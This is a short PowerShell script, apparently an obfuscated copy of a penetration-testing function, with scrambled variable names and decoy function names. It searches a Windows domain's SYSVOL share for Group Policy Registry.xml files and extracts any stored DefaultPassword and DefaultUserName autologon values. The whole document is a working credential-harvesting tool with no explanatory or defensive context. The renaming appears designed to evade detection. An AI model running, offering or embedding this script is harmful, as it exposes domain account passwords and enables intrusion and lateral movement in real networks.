function amazon 
{

    
    [CmdletBinding()]
    Param ()
    

    Set-StrictMode -Version 2
    

    function eucalypti 
    {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try 
        {
            $cPuchWJBQpnMF9d = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)


            $kpSovbBSo9OvwIK = @()
            $gjTldzMPorSYTqR = @()
            

            if (($Xml.innerxml -like "*DefaultPassword*") -and ($Xml.innerxml -like "*DefaultUserName*"))
            {
                $props = $xml.GetElementsByTagName("Properties")
                foreach($prop in $props)
                {
                    switch ($prop.name) 
                    {
                        'DefaultPassword'
                        {
                            $kpSovbBSo9OvwIK += , $prop | Select-Object -ExpandProperty Value
                        }
                    
                        'DefaultUsername'
                        {
                            $gjTldzMPorSYTqR += , $prop | Select-Object -ExpandProperty Value
                        }
                }

                    Write-Verbose "Potential password in $File"
                }
                         

                if (!($kpSovbBSo9OvwIK)) 
                {
                    $kpSovbBSo9OvwIK = '[BLANK]'
                }

                if (!($gjTldzMPorSYTqR))
                {
                    $gjTldzMPorSYTqR = '[BLANK]'
                }
                       

                $monNDWKNozPOXXH = @{'Passwords' = $kpSovbBSo9OvwIK;
                                      'UserNames' = $gjTldzMPorSYTqR;
                                      'File' = $File}
                    
                $mMbNx9Y9ufuABlP = New-Object -TypeName PSObject -Property $monNDWKNozPOXXH
                Write-Verbose "The password is between {} and may be more than one value."
                if ($mMbNx9Y9ufuABlP)
                {
                    Return $mMbNx9Y9ufuABlP
                } 
            }
        }
        catch {Write-Error $Error[0]}
    }

    try {

        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
    

        Write-Verbose 'Searching the DC. This could take a while.'
        $vpW9mlOuymLFBVJ = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
    
        if ( -not $vpW9mlOuymLFBVJ ) {throw 'No preference files found.'}

        Write-Verbose "Found $($vpW9mlOuymLFBVJ | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $vpW9mlOuymLFBVJ) {
                $eCYfqvgThjEzkRo = (eucalypti $File.Fullname)
                Write-Output $eCYfqvgThjEzkRo
        }
    }

    catch {Write-Error $Error[0]}
}
